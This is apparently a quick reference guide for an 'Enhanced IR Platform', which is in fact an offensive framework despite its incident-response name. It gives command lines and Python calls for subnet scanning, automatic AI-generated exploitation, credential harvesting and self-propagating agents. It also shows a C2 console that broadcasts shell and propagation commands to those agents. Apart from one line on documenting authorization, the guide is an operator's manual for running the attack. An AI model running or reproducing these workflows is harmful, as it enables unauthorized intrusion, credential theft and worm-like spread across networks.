# Enhanced IR Platform - Quick Reference Guide

## Quick Start

### 1. Setup Configuration
```bash
# Edit config.json and set your OpenRouter API key
nano config.json
# Set "ai.openrouter_api_key" to your key
```

### 2. Run Enhanced Operation
```bash
python iroperator.py \
    --engagement "ENG-2024-001" \
    --targets "192.168.1.0/24" \
    --api-key "your-openrouter-key" \
    --auto-exploit \
    --enable-propagation \
    --max-depth 2
```

### 3. View Reports
```bash
# Operation reports
ls data/reports/REPORT-*.json

# Access recovery reports
ls data/reports/ACCESS-*.json

# Session exports
ls data/exports/SESSION-*.json
```

## Module Usage Examples

### Advanced Detection
```python
from exploits.advanced_detection import AdvancedDetection

detector = AdvancedDetection()
result = detector.deep_scan_service({
    "ip": "192.168.1.100",
    "port": 80,
    "service": "http"
})
# Access: result['vulnerabilities'], result['misconfigurations'], result['credentials']
```

### Intelligent Exploit Engine
```python
from exploits.intelligent_exploit_engine import IntelligentExploitEngine

engine = IntelligentExploitEngine(openrouter_api_key="key")
result = engine.find_or_create_exploit(
    target={"ip": "192.168.1.100", "port": 22, "service": "ssh"},
    vulnerability={"cve_id": "CVE-2024-XXXX", "type": "RCE"}
)
# Access: result['exploit_code'], result['success'], result['access_method']
```

### Comprehensive Recorder
```python
from exploits.comprehensive_recorder import ComprehensiveRecorder

recorder = ComprehensiveRecorder()
session_id = recorder.create_session(engagement_id="ENG-001")

# Record exploitation
recorder.record_exploitation_attempt(
    session_id=session_id,
    target={"ip": "192.168.1.100"},
    attempt={"cve_id": "CVE-2024-XXXX", "success": True}
)

# Generate access report
report = recorder.generate_access_report(session_id=session_id)
```

### Enhanced Agent
```python
from agent.enhanced_agent import EnhancedAgent

agent = EnhancedAgent(
    agent_id="AGENT-001",
    c2_server="192.168.1.10",
    c2_port=8443,
    propagate=True,
    max_propagation_depth=2
)
agent.start()
```

## Common Workflows

### Workflow 1: Scan Only (No Exploitation)
```bash
python iroperator.py \
    --engagement "ENG-001" \
    --targets "192.168.1.0/24" \
    --deep-scan \
    --no-auto-exploit
```

### Workflow 2: Full AI-Driven Operation
```bash
python iroperator.py \
    --engagement "ENG-001" \
    --targets "192.168.1.0/24" \
    --api-key "your-key" \
    --auto-exploit \
    --max-targets 5 \
    --deep-scan
```

### Workflow 3: With Agent Propagation
```bash
python iroperator.py \
    --engagement "ENG-001" \
    --targets "192.168.1.0/24" \
    --api-key "your-key" \
    --auto-exploit \
    --enable-propagation \
    --max-depth 2
```

### Workflow 4: Access Recovery Focus
```bash
# Run operation
python iroperator.py \
    --engagement "ENG-001" \
    --targets "192.168.1.0/24" \
    --api-key "your-key" \
    --auto-exploit

# After completion, generate access recovery report
python -c "
from iroperator import EnhancedIROperator
operator = EnhancedIROperator()
operator.start_operation('ENG-001', 'Recovery')
operator.generate_access_recovery_report()
"
```

## Configuration Flags

### Scanner Options
- `--deep-scan`: Enable deep service analysis (default: true)
- `--targets`: IP ranges to scan
- AI analysis controlled by `config.json`

### Exploitation Options
- `--auto-exploit`: Enable automatic exploitation
- `--max-targets`: Limit number of targets to exploit
- Intelligent engine enabled in `config.json`

### AI Options
- `--api-key`: OpenRouter API key
- `--no-ai`: Disable AI analysis completely
- Model selection in `config.json`

### Agent Options
- `--enable-propagation`: Enable agent self-propagation
- `--max-depth`: Maximum propagation depth (default: 2)
- Sleep time and discovery in `config.json`

## Data Locations

```
workspace/
├── data/
│   ├── intel.db              # Vulnerability intelligence
│   ├── recorder.db           # Comprehensive evidence
│   ├── c2_database.db        # C2 and agent data
│   ├── reports/
│   │   ├── REPORT-*.json     # Operation reports
│   │   └── ACCESS-*.json     # Access recovery reports
│   ├── exports/
│   │   └── SESSION-*.json    # Session exports
│   └── evidence/             # Collected evidence files
├── logs/
│   ├── operator.log          # Main operation logs
│   └── agent_*.log           # Agent logs
└── outputs/
    └── exploits/             # Generated exploit code
```

## Report Structure

### Operation Report
```json
{
  "report_id": "REPORT-20240104120000",
  "operation_id": "OP-20240104120000",
  "engagement_id": "ENG-2024-001",
  "summary": {
    "targets_scanned": 25,
    "services_detected": 150,
    "vulnerabilities_found": 45,
    "misconfigurations_found": 23,
    "credentials_found": 8,
    "exploits_successful": 5,
    "agents_deployed": 5
  }
}
```

### Access Recovery Report
```json
{
  "session_id": "SESSION-001",
  "engagement_id": "ENG-2024-001",
  "credentials": [
    {
      "type": "SSH",
      "username": "admin",
      "password": "********",
      "target": "192.168.1.100"
    }
  ],
  "access_methods": [
    {
      "type": "SSH_KEY_AUTH",
      "target": "192.168.1.100",
      "details": "Private key in ~/.ssh/id_rsa",
      "verification": "Successful login"
    }
  ],
  "recovery_procedures": [...]
}
```

## C2 Commands

### From C2 Console
```python
# List agents
c2.list_agents()

# Issue command to specific agent
c2.issue_command(agent_id="AGENT-001", command="shell whoami")

# Broadcast to all agents
c2.broadcast_command(command="scan 192.168.2.0/24")
```

### Available Agent Commands
- `shell <command>` - Execute shell command
- `scan <target>` - Scan local network
- `propagate` - Attempt propagation
- `gather` - Gather system intelligence
- `checkin` - Force check-in

## Troubleshooting

### Issue: Import Errors
```bash
# Ensure all modules are in correct directories
ls -la exploits/ agent/ scanner/ c2/

# Verify Python path
export PYTHONPATH="${PYTHONPATH}:/workspace"
```

### Issue: Database Locked
```bash
# Check for other processes
ps aux | grep python

# Kill stuck processes
pkill -9 -f iroperator.py
```

### Issue: No Exploits Found
- Check if OpenRouter API key is valid
- Verify network connectivity
- Check vulnerability data in intel.db
- Review logs for errors: `cat logs/operator.log`

### Issue: Agent Not Checking In
```bash
# Verify C2 is running
netstat -tlnp | grep 8443

# Check firewall
sudo ufw allow 8443/tcp

# Review agent logs
cat logs/agent_*.log
```

## Performance Tips

1. **Limit Targets**: Use `--max-targets` for initial testing
2. **Parallel Scanning**: Scanner automatically uses parallel scans
3. **Deep Scan Timeouts**: Adjust `scanner.deep_scan_timeout` in config
4. **AI Timeout**: Adjust `ai.timeout` in config if API is slow
5. **Database Maintenance**: Regular cleanup of old sessions

## Security Best Practices

1. **Always use engagement IDs** for tracking
2. **Limit propagation depth** (default: 2 is safe)
3. **Review reports immediately** after operations
4. **Store configs securely** (especially API keys)
5. **Export sessions** for evidence preservation
6. **Rotate credentials** after access recovery
7. **Document authorization** before operations

## Quick Commands Reference

```bash
# Check system status
python quick_start.py --check

# Run syntax check
python3 -m py_compile iroperator.py

# View recent logs
tail -f logs/operator.log

# View database contents
sqlite3 data/recorder.db "SELECT * FROM sessions LIMIT 5;"

# Generate summary
python -c "import json; print(json.dumps(json.load(open('data/reports/REPORT-*.json')), indent=2))"

# Clean up old data
find data/ -name "*.db" -mtime +30 -delete
```

## Support Files

- **Full Documentation**: `README.md`
- **Enhanced Features**: `ENHANCED_FEATURES.md`
- **Deployment Guide**: `DEPLOYMENT_GUIDE.md`
- **Configuration**: `config.json`
- **Project Structure**: `PROJECT_STRUCTURE.md`

## Getting Help

1. Check logs: `logs/operator.log`
2. Review documentation files
3. Verify configuration in `config.json`
4. Check Python dependencies: `pip install -r requirements.txt`
5. Ensure nmap is installed: `which nmap`

## Version

Enhanced IR Platform v2.0
- Advanced multi-technique detection
- Intelligent exploit engine
- Comprehensive evidence collection
- Self-propagating agents
- Access recovery reporting